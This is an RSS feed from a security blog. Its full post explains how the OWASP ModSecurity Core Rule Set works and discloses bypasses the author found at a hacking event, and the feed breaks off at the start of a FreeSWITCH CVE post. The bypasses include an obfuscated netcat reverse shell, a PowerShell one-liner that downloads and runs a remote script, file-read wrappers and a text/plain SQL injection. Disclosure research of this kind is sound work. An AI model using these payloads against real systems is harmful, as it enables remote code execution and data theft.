<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on 0xInfection&#39;s Blog — Ramblings of an Infected Geek</title>
        <link>https://0xinfection.xyz/posts/</link>
        <description>Recent content in Posts on 0xInfection&#39;s Blog — Ramblings of an Infected Geek</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>0xInfection</copyright>
        <lastBuildDate>Thu, 21 Aug 2025 00:00:00 +0530</lastBuildDate>
        <atom:link href="https://0xinfection.xyz/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Bypassing ModSecurity CRS for RCE(s)</title>
            <link>https://0xinfection.xyz/posts/bypassing-modsecurity-crs-for-rces/</link>
            <pubDate>Thu, 21 Aug 2025 00:00:00 +0530</pubDate>
            
            <guid>https://0xinfection.xyz/posts/bypassing-modsecurity-crs-for-rces/</guid>
            <description>&lt;p&gt;Hola amigos! I&amp;rsquo;m excited to finally share this blog post that I started back in 2022. After some time away, I&amp;rsquo;ve finally gathered the energy to complete and publish this blog.&lt;/p&gt;
&lt;p&gt;Today&amp;rsquo;s post explores the bypasses I discovered for the OWASP CRS (Core Rule Set) Project during 1337UP0522 live hacking event hosted by The Paranoids team at Yahoo in collaboration with Intigriti. Needless to mention, the event was a blast!&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Hola amigos! I&rsquo;m excited to finally share this blog post that I started back in 2022. After some time away, I&rsquo;ve finally gathered the energy to complete and publish this blog.</p>
<p>Today&rsquo;s post explores the bypasses I discovered for the OWASP CRS (Core Rule Set) Project during 1337UP0522 live hacking event hosted by The Paranoids team at Yahoo in collaboration with Intigriti. Needless to mention, the event was a blast!</p>
<h2 id="quick-primer-to-wafs">Quick Primer to WAFs</h2>
<p>Web Application Firewalls (WAFs) serve as a crucial security layer that blocks web-based attacks. The concept is straightforward: when an attacker sends a malicious request, the WAF intercepts and blocks it before it can reach the web application. WAFs operate by detecting attacks through a set of predefined rules. <a href="https://github.com/owasp-modsecurity/ModSecurity">ModSecurity</a>, for instance, is a popular open-source WAF implementation. A widely-adopted and compatible ruleset for ModSecurity is available through the <a href="https://github.com/coreruleset/coreruleset/tree/main/rules">OWASP CRS (Core Rule Set)</a> Project.</p>
<h3 id="how-does-modsecurity-and-crs-work-together">How does ModSecurity and CRS work together?</h3>
<p>Before we explore the bypasses in detail, it is important to understand the relationship between ModSecurity and CRS. In essence, ModSecurity serves as the engine that inspects and analyses HTTP requests and responses, while CRS provides the ruleset that matches various attack patterns.</p>
<p>CRS works in phases when inspecting requests and responses. A high level overview of how CRS works depicted below:</p>

    <img src="flow.png"  alt="CRS Flow"  class="center"  />


<p>Essentially, every phase of the WAF inspects certain parameters of the HTTP transaction for anomalies:</p>
<ul>
<li><strong>Phase 1</strong>: Inspects HTTP request headers (e.g. blacklisted user-agents, protocol violations, etc).</li>
<li><strong>Phase 2</strong>: Inspects the HTTP request body / parameters (e.g. SQLI, XSS, RCEs, etc.)</li>
<li><strong>Phase 3</strong>: Inspects the response headers (e.g. sensitive data leaks, session management, etc.)</li>
<li><strong>Phase 4</strong>: Inspects the response body (e.g. sensitive data leaks, stack traces, etc.)</li>
<li><strong>Phase 5</strong>: Logging what was found in the previous phases (for audits, rule tuning, etc.)</li>
</ul>
<p>CRS uses <em>Anomaly Scoring</em> to decide whether a request gets through or gets blocked. It also gives you different <em>Paranoia Levels</em> that you can adjust based on how secure you want your setup to be.</p>
<h4 id="anomaly-scoring">Anomaly Scoring</h4>
<p>From <a href="https://coreruleset.org/docs/2-how-crs-works/2-1-anomaly_scoring/">official docs</a>:</p>
<blockquote>
<p>Anomaly scoring, also known as “collaborative detection”, is a scoring mechanism used in CRS. It assigns a numeric score to HTTP transactions (requests and responses), representing how ‘anomalous’ they appear to be. Anomaly scores can then be used to make blocking decisions. The default CRS blocking policy, for example, is to block any transaction that meets or exceeds a defined anomaly score threshold.</p></blockquote>
<p>In short, CRS uses a point-based system called <em>Anomaly Scoring</em> to determine if a request is malicious. Each suspicious pattern adds points to a request&rsquo;s score. If the total score exceeds a threshold, the request gets blocked.</p>
<h4 id="paranoia-levels">Paranoia Levels</h4>
<p>From the <a href="https://coreruleset.org/docs/2-how-crs-works/2-2-paranoia_levels/">official docs</a>:</p>
<blockquote>
<p>The paranoia level (PL) makes it possible to define how aggressive CRS is.</p>
<p>A higher paranoia level makes it harder for an attacker to go undetected. Yet this comes at the cost of more false positives: more false alarms. That’s the downside to running a rule set that detects almost everything: your business / service / web application is also disrupted.</p></blockquote>
<p>To sum it up, <em>Paranoia Levels</em> basically tell you how thoroughly you want the WAF to examine incoming HTTP requests. CRS has 4 paranoia levels, PL1 to PL4, with PL1 giving you basic protection and PL4 being super aggressive.</p>
<p>The higher you go with paranoia levels, the more rules get turned on and the stricter the filtering gets. While PL4 gives you maximum security, it can really mess with your normal traffic. Most people stick with PL1 or PL2 to keep things balanced.</p>
<h3 id="rules-in-crs">Rules in CRS</h3>
<p>Now let&rsquo;s talk about how rules work in CRS.</p>
<p>Rules within CRS are defined by the <a href="https://github.com/owasp-modsecurity/ModSecurity/wiki/Reference-Manual-(v2.x)#SecRule"><code>SecRule</code></a> directive. Each <code>SecRule</code> follows the following structure:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>SecRule {VARIABLES} {OPERATOR} {<span style="color:#e6db74">&#34;ACTIONS&#34;</span>}
</span></span></code></pre></div><ul>
<li><code>VARIABLES</code>: Defines which parts of the HTTP transaction to inspect (<code>REQUEST_HEADERS</code>, <code>REQUEST_BODY</code>, etc).</li>
<li><code>OPERATOR</code>: Defines how to evaluate the rules, for example, regex matching (<code>@rx</code>), substring matching (<code>@contains</code>), etc.</li>
<li><code>ACTIONS</code>: Defines what to do if the rule matches (phases, IDs, transformations, logging, blocking, scoring, etc).</li>
</ul>
<p>So if a rule looks like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>SecRule REQUEST_HEADERS:User<span style="color:#f92672">-</span>Agent <span style="color:#e6db74">&#34;@rx curl/.*&#34;</span> <span style="color:#e6db74">&#34;id:1010,phase:1,log,pass,msg:&#39;Detected curl client&#39;&#34;</span>
</span></span></code></pre></div>
    <img src="rule.png"  alt="CRS Rule"  class="center"  />


<p><strong>Variable (<code>REQUEST_HEADERS:User-Agent</code>)</strong></p>
<ul>
<li>Directs ModSecurity to look at the <code>User-Agent</code> header.</li>
</ul>
<p><strong>Operator (<code>@rx curl/.*</code>)</strong></p>
<ul>
<li>Uses regex matching to match any <code>User-Agent</code> containing <code>curl/{any_version}</code>.</li>
</ul>
<p><strong>Actions</strong></p>
<ul>
<li>Action (<code>id:1010</code>): Assigns a unique ID to the rule.</li>
<li>Action (<code>phase:1</code>): Runs the rule during request header parsing.</li>
<li>Action (<code>log</code>): Writes a log entry when the rule matches.</li>
<li>Action (<code>pass</code>): Allows the request to continue processing. No blocking or dropping occurs.</li>
<li>Action (<code>msg:'Detected curl client'</code>): Adds a custom message describing the detection.</li>
</ul>
<h2 id="the-bypasses">The Bypasses</h2>
<p>Now, lets talk about the bypasses that I crafted. For the bypasses below, I will break down my thought process on how I crafted the bypasses, listing down the steps of crafting a bypass.</p>
<h3 id="spawning-reverse-shells">Spawning Reverse Shells</h3>
<p>Spawning a reverse shell in *nix systems is pretty straightforward. A simple <code>/bin/nc -e /bin/bash 10.0.0.2 10002</code> will connect back to your pingback server and you&rsquo;ll be able to execute commands on the target machine.
However, CRS properly detects and blocks the usage of <code>nc</code> (and all other variants).</p>
<p>This is where bash shell globbing patterns came to rescue. I tried using the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">/</span>[abc]<span style="color:#f92672">in</span><span style="color:#f92672">/</span>nc <span style="color:#f92672">-</span>e <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>bash <span style="color:#ae81ff">10.0.0.2</span> <span style="color:#ae81ff">10002</span>
</span></span></code></pre></div><p>It expands to match:</p>
<ul>
<li><code>/ain/nc</code></li>
<li><code>/bin/nc</code> &lt;- Points to our binary</li>
<li><code>/cin/nc</code></li>
</ul>
<p>But that got blocked as well since <code>/bin/bash</code> was also being detected. <code>/bin/zsh</code>, though was not being detected. All other shell variants, e.g. <code>/bin/sh</code>, <code>/bin/fish</code>, <code>/bin/ash</code> etc, were blocked. So I was able to come up with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">/</span>[abc]<span style="color:#f92672">in</span><span style="color:#f92672">/</span>nc <span style="color:#f92672">-</span>e <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>zsh <span style="color:#ae81ff">10.0.0.2</span> <span style="color:#ae81ff">10002</span>
</span></span></code></pre></div><p>However, the pattern was still being blocked because <code>nc -e</code> is a very known syntax for spawning reverse shells. Fiddling around for a way to get around this situation, I figured out that <code>ln</code> (used for linking files) is not blocked.
The final bypass payload looked similar to this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>ln <span style="color:#f92672">-</span>s <span style="color:#f92672">/[</span>abc<span style="color:#f92672">]</span>in<span style="color:#f92672">/</span>nc <span style="color:#f92672">/</span>tmp<span style="color:#f92672">/</span>pew; <span style="color:#f92672">/</span>tmp<span style="color:#f92672">/</span>pew <span style="color:#f92672">-</span>e <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>zsh 10.<span style="color:#a6e22e">0</span>.<span style="color:#a6e22e">0</span>.<span style="color:#a6e22e">2</span> 10002
</span></span></code></pre></div><p>At the time of publishing the article, a set of 5 rules detect the payload:</p>
<ul>
<li><a href="https://github.com/coreruleset/coreruleset/blob/b3722fc3f7e3213402f2495eb7c33a186cb937b5/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf#L99"><code>930120</code></a> - OS File Access Attempt (PL1)</li>
<li><a href="https://github.com/coreruleset/coreruleset/blob/b3722fc3f7e3213402f2495eb7c33a186cb937b5/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf#L293"><code>932130</code></a> - Remote Command Execution: Unix Shell Expression Found (PL1)</li>
<li><a href="https://github.com/coreruleset/coreruleset/blob/b3722fc3f7e3213402f2495eb7c33a186cb937b5/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf#L631"><code>932160</code></a> - Remote Command Execution: Unix Shell Code Found (PL1)</li>
<li><a href="https://github.com/coreruleset/coreruleset/blob/b3722fc3f7e3213402f2495eb7c33a186cb937b5/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf#L1296"><code>932240</code></a> - Remote Command Execution: Unix Command Injection evasion attempt detected (PL2)</li>
<li><a href="https://github.com/coreruleset/coreruleset/blob/b3722fc3f7e3213402f2495eb7c33a186cb937b5/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf#L1578"><code>932236</code></a> - Remote Command Execution: Unix Command Injection (command without evasion) (PL2)</li>
</ul>
<h3 id="executing-arbitrary-powershell">Executing Arbitrary PowerShell</h3>
<p>There are specific PowerShell cmdlets allow you to fetch and run remote scripts directly in memory without the payload touching the disk.
A very common fileless attack technique looks something like the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Invoke<span style="color:#f92672">-</span>Expression (Invoke<span style="color:#f92672">-</span>WebRequest http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.0.10.10</span>:<span style="color:#ae81ff">8000</span><span style="color:#f92672">/</span>x<span style="color:#f92672">.</span>ps1)
</span></span></code></pre></div><p><code>Invoke-WebRequest</code> fetches the <code>x.ps1</code> file from the remote host and <code>Invoke-Expression</code> executes it as PowerShell code.
As expected, CRS blocks both cmdlets <code>Invoke-Expression</code> and <code>Invoke-WebRequest</code>.</p>
<p>Windows Powershell, however, comes with a set of built-in aliases for a lot of the cmdlets &ndash; most of which ModSecurity did not have in its blacklists.</p>
<p>That gives us a quick and neat bypass:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-PowerShell" data-lang="PowerShell"><span style="display:flex;"><span>iex (iwr http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.0</span>.10.<span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8000</span>/x.ps1)
</span></span></code></pre></div><hr>
<p>PowerShell can be used to execute binaries on a Windows machine, something similar to <code>powershell.exe C:\windows\system32\notepad.exe</code>, which pops up a notepad. Windows PowerShell does not require the extension to execute, that gives us our second bypass, nothing magical:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>powershell C:<span style="color:#960050;background-color:#1e0010">\</span>wind<span style="color:#f92672">??</span>s<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">*</span>32<span style="color:#960050;background-color:#1e0010">\</span>note<span style="color:#f92672">*</span>.<span style="color:#a6e22e">exe</span>
</span></span></code></pre></div><p>To break the above payload down:</p>
<ul>
<li><code>?</code> - Matches exactly 1 character</li>
<li><code>*</code> - Matches 0 or more charcters</li>
</ul>
<p>So essentially:</p>
<ul>
<li><code>wind??s</code> matches <em>windows</em></li>
<li><code>*32</code> matches the <em>system32</em> folder</li>
<li><code>note*.exe</code> matches <em>notepad.exe</em></li>
</ul>
<p>At the time of publishing the article, the following two rules detect the payload:</p>
<ul>
<li><a href="https://github.com/coreruleset/coreruleset/blob/b3722fc3f7e3213402f2495eb7c33a186cb937b5/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf#L214"><code>932120</code></a> - Remote Command Execution: Windows PowerShell Command Found (PL1)</li>
<li><a href="https://github.com/coreruleset/coreruleset/blob/b3722fc3f7e3213402f2495eb7c33a186cb937b5/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf#L1296"><code>932240</code></a> - Remote Command Execution: Unix Command Injection evasion attempt detected (PL2)</li>
</ul>
<h3 id="accessing-local-files">Accessing Local Files</h3>
<p>This section of bypasses was more RTFM than hacker magic. CRS blacklists a list of default sensitive files that should not be allowed in HTTP requests.</p>
<p>The blacklist for SSH private keys within CRS looked something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.ssh<span style="color:#f92672">/</span>authorized_keys
</span></span><span style="display:flex;"><span>.ssh<span style="color:#f92672">/</span>config
</span></span><span style="display:flex;"><span>.ssh<span style="color:#f92672">/</span>id_dsa
</span></span><span style="display:flex;"><span>.ssh<span style="color:#f92672">/</span>id_dsa.pub
</span></span><span style="display:flex;"><span>.ssh<span style="color:#f92672">/</span>id_rsa
</span></span><span style="display:flex;"><span>.ssh<span style="color:#f92672">/</span>id_rsa.pub
</span></span><span style="display:flex;"><span>.ssh<span style="color:#f92672">/</span>identity
</span></span><span style="display:flex;"><span>.ssh<span style="color:#f92672">/</span>identity.pub
</span></span><span style="display:flex;"><span>.ssh<span style="color:#f92672">/</span>known_hosts
</span></span></code></pre></div><p>Already noticed what&rsquo;s missing? Yep, <code>.ssh/id_ecdsa</code> and <code>.ssh/id_ecdsa.pub</code> are missing.</p>
<p>Similarly, it was missing a couple of other missing important files:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>security<span style="color:#f92672">/</span>pwquality.conf
</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>security<span style="color:#f92672">/</span>faillock.conf
</span></span></code></pre></div><p>These gives us our third bypass.</p>
<p>This bypass was properly fixed by updates to the <code>lfi-os-files.data</code> which is utilised by rule <a href="https://github.com/coreruleset/coreruleset/blob/b3722fc3f7e3213402f2495eb7c33a186cb937b5/rules/REQUEST-930-APPLICATION-ATTACK-LFI.conf#L90-L118"><code>930120</code></a>.</p>
<h3 id="abusing-legacy-protocols-and-php-wrappers">Abusing Legacy Protocols and PHP Wrappers</h3>
<p>A lesser known, legacy Java (&lt;= JDK 8) protocol is <code>netdoc:</code>, which acts similarly to the <code>file:</code> protocol in Java-based XML parsers. CRS appropriately detects most of the protocols like <code>http://</code>, <code>ftp://</code>, <code>file://</code>, etc, but does not filter out <code>netdoc:</code>. This makes it possible to bypass CRS in Java environments (&lt;= JDK 8).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>netdoc:<span style="color:#f92672">///</span>etc<span style="color:#f92672">/</span>passwd
</span></span></code></pre></div><p>Combining the above missing files, we can cook something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>netdoc:<span style="color:#f92672">///</span>etc<span style="color:#f92672">/</span>security<span style="color:#f92672">/</span>pwquality<span style="color:#f92672">.</span>conf
</span></span></code></pre></div><p>Missing PHP wrappers also contributed to another bypass, I noticed that <code>compress.zip://</code>, <code>zlib://</code>, <code>glob://</code>, <code>expect://</code>, <code>zip://</code>, etc were blocked, however <code>compress.bzip2://</code> wasn&rsquo;t.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>compress<span style="color:#f92672">.</span>bzip2:<span style="color:#f92672">//</span>path<span style="color:#f92672">/</span>to<span style="color:#f92672">/</span>sensitive<span style="color:#f92672">.</span>bz2
</span></span></code></pre></div><p>The following 2 rules detect these payloads now:</p>
<ul>
<li><a href="https://github.com/coreruleset/coreruleset/blob/b3722fc3f7e3213402f2495eb7c33a186cb937b5/rules/REQUEST-931-APPLICATION-ATTACK-RFI.conf#L119"><code>931130</code></a> - Possible Remote File Inclusion (RFI) Attack: Off-Domain Reference/Link (PL2)</li>
<li><a href="https://github.com/coreruleset/coreruleset/blob/b3722fc3f7e3213402f2495eb7c33a186cb937b5/rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf#L253"><code>933200</code></a> - PHP Injection Attack: Wrapper scheme detected (PL1)</li>
</ul>
<h3 id="complete-request-body-bypass">Complete Request Body Bypass</h3>
<p>This one deserves a special mention as it probably is the most interesting of all my findings that I stumbled upon.</p>
<p>When reading up documentation and source code of how ModSecurity activates inspection of rules, I found that ModSecurity employs specific body processors based upon the identified <code>Content-Type</code> header. These processors are designed to understand and break down the request body into a usable structure for rule evaluation.</p>
<p>The JSON and XML parsers are dynamically activated by rules within the ModSecurity configuration, typically the <code>ctl:requestBodyProcessor</code> action within a <code>SecRule</code> matching the corresponding <code>Content-Type</code> header.</p>
<p>Some parsers supported by the WAF engine are:</p>
<ul>
<li><code>application/x-www-form-urlencoded</code>: The default behavior for forms. ModSecurity parses this into the <code>ARGS</code> (arguments) variables, accessible to rules.</li>
<li><code>multipart/form-data</code>: Used for file uploads. This is a more complex format requiring specialized parsing to differentiate between form fields and uploaded files.</li>
<li><code>application/json</code>: Engages the JSON parser.</li>
<li><code>(text|application)/xml</code>: Engages the XML parser.</li>
</ul>
<p>This clicked something in my head &ndash; what about backends do not rely on the <code>Content-Type</code> header to process requests. What happens when I use <code>text/plain</code>? To my surprise, it worked. Payloads as simple as <code>cat ../../etc/passwd</code> (which will easily get detected at PL1) went through the WAF completely unchecked.</p>

    <img src="meme.jpg"  alt="meme"  class="center"  style="max-width: 450px; height: auto;"  />


<p>Lets try to understand why this bypass is dangerous.</p>
<p>Suppose a user login endpoint request looks something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">POST</span> <span style="color:#960050;background-color:#1e0010">/login</span> <span style="color:#960050;background-color:#1e0010">HTTP/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Host:</span> <span style="color:#960050;background-color:#1e0010">api.domain.com</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Type:</span> <span style="color:#960050;background-color:#1e0010">application/json</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Length:</span> <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#f92672">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>}
</span></span></code></pre></div><p>A classic SQL injection attack to bypass the login flow would look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">POST</span> <span style="color:#960050;background-color:#1e0010">/login</span> <span style="color:#960050;background-color:#1e0010">HTTP/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Host:</span> <span style="color:#960050;background-color:#1e0010">api.example.com</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Type:</span> <span style="color:#960050;background-color:#1e0010">application/json</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Length:</span> <span style="color:#ae81ff">48</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#f92672">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;idkthepassword&#39; OR 1=1--&#34;</span>}
</span></span></code></pre></div><p>With CRS enabled, the following rules would come shouting at you:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">942130</span> PL2 SQL Injection Attack: SQL Boolean<span style="color:#f92672">-</span>based attack detected
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">942180</span> PL2 Detects basic SQL authentication bypass attempts <span style="color:#ae81ff">1</span><span style="color:#f92672">/</span><span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">942330</span> PL2 Detects classic SQL injection probings <span style="color:#ae81ff">1</span><span style="color:#f92672">/</span><span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">942390</span> PL2 SQL Injection Attack
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">942521</span> PL2 Detects basic SQL authentication bypass attempts <span style="color:#ae81ff">4.1</span><span style="color:#f92672">/</span><span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">942522</span> PL2 Detects basic SQL authentication bypass attempts <span style="color:#ae81ff">4.1</span><span style="color:#f92672">/</span><span style="color:#ae81ff">4</span>
</span></span></code></pre></div><p>If the backend of the application does not rely on the <code>Content-Type</code> request header value and it decodes the request body anyway, ModSecurity will fall back to the default request body parser leading to the following bypass with the <code>Content-Type</code> header set to <code>text/plain</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">POST</span> <span style="color:#960050;background-color:#1e0010">/login</span> <span style="color:#960050;background-color:#1e0010">HTTP/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Host:</span> <span style="color:#960050;background-color:#1e0010">api.example.com</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Type:</span> <span style="color:#960050;background-color:#1e0010">text/plain</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">Content-Length:</span> <span style="color:#ae81ff">48</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#f92672">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;idkthepassword&#39; OR 1=1--&#34;</span>}
</span></span></code></pre></div><p>The CRS project has since removed the non-standard <code>text/plain</code> from its list of allowed values within the <code>Content-Type</code> header (<a href="https://github.com/coreruleset/coreruleset/commit/6a9c854b80725a7b03be34c21ab9502ae75639f7"><code>6a9c854</code></a>) and has introduced a <a href="https://github.com/coreruleset/coreruleset/blob/main/crs-setup.conf.example#L490-L497">warning message</a> about the bypass:</p>
<pre tabindex="0"><code># Bypass Warning: some applications may not rely on the content-type
# request header in order to parse the request body. This could make
# an attacker able to send malicious URLENCODED/JSON/XML payloads
# without being detected by the WAF. Allowing request content-type
# that doesn&#39;t activate any body processor (for example: &#34;text/plain&#34;,
# &#34;application/x-amf&#34;, &#34;application/octet-stream&#34;, etc..) could lead
# to a WAF bypass. For example, a malicious JSON payload submitted with
# a &#34;text/plain&#34; content type may still be interpreted as JSON by a
# backend application but would not trigger the JSON body parser at the
# WAF, leading to a bypass. To avoid bypasses, you must enable the appropriate
# body parser based on the expected data in the request bodies (For example
# JSON for JSON data, XML for XML data, etc).
</code></pre><p>CRS now detects such non-standard content-types via:</p>
<ul>
<li><a href="https://github.com/coreruleset/coreruleset/blob/b3722fc3f7e3213402f2495eb7c33a186cb937b5/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf#L935"><code>920420</code></a> - Request content type is not allowed by policy</li>
</ul>
<h2 id="credits-where-its-due">Credits Where Its Due</h2>
<p>ModSecurity and the OWASP Core Rule Set (CRS) are invaluable contributions to the open-source community.</p>
<p>I would like to extend my appreciation to their maintainers for their continued support of such a critical security project.
My thanks also go to <a href="https://x.com/intigriti">Intigriti</a> and the <a href="https://x.com/theparanoids">@TheParanoids</a> team at Yahoo for organizing the hacking event and for the kind invitation to participate.</p>
<p>That’s all folks. Thank you for reading! Cheers! 🥂</p>
]]></content>
        </item>
        
        <item>
            <title>Analyzing two FreeSWITCH vulnerabilities -- CVE-2021-41157 &amp; CVE-2021-37624</title>
            <link>https://0xinfection.xyz/posts/analyzing-two-freeswitch-vulnerabilities--cve-2021-41157-cve-2021-37624/</link>
            <pubDate>Sun, 31 Oct 2021 00:00:00 +0530</pubDate>
            
            <guid>https://0xinfection.xyz/posts/analyzing-two-freeswitch-vulnerabilities--cve-2021-41157-cve-2021-37624/</guid>
            <description>&lt;p&gt;This post is about two vulnerabilities that I researched on a year back in the FreeSWITCH VoIP server that were fixed and disclosed publicly a few weeks ago. Both of the vulnerabilities were issues that affected the SIP functionality in all versions below v1.10.7 and were categorized under &lt;a href=&#34;https://cwe.mitre.org/data/definitions/287.html&#34;&gt;CWE-287&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;
&lt;p&gt;The story dates to a year ago, back when I was still learning about RTC (real-time communications) security and working under &lt;a href=&#34;https://twitter.com/sandrogauci&#34;&gt;Sandro&lt;/a&gt; &amp;ndash; where we used to do a lot of research on real-time communication infra. One fine day, he asked me to get familiar with FreeSWITCH, since it was a good alternative to Asterisk. A few days into fiddling around, I figured out that there isn&amp;rsquo;t much security enabled for a some SIP components in a default installation.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>This post is about two vulnerabilities that I researched on a year back in the FreeSWITCH VoIP server that were fixed and disclosed publicly a few weeks ago. Both of the vulnerabilities were issues that affected the SIP functionality in all versions below v1.10.7 and were categorized under <a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287</a>.</p>
<h2 id="background">Background</h2>
<p>The story dates to a year ago, back when I was still learning about RTC (real-time communications) security and working under <a href="https://twitter.com/sandrogauci">Sandro</a> &ndash; where we used to do a lot of research on real-time communication infra. One fine day, he asked me to get familiar with FreeSWITCH, since it was a good alternative to Asterisk. A few days into fiddling around, I figured out that there isn&rsquo;t much security enabled for a some SIP components in a default installation.</p>
<p>In this post, I&rsquo;ll do a detailed walkthrough of the setup and the vulnerabilities. I also release a scanning and exploitation toolkit alongside this, so that anyone can reproduce and validate the bugs.</p>
<h2 id="the-setup">The Setup</h2>
<p>The initial setup of FreeSWITCH can be a bit tricky, hence I&rsquo;ll walk through the setup from scratch &ndash; so that the bugs are reproducible and can serve as a reference for any future wanderer in pursuit of knowledge. For our demo, I&rsquo;ll quickly get a base Debian VM up and running. The next set of steps are as below:</p>
<ul>
<li>
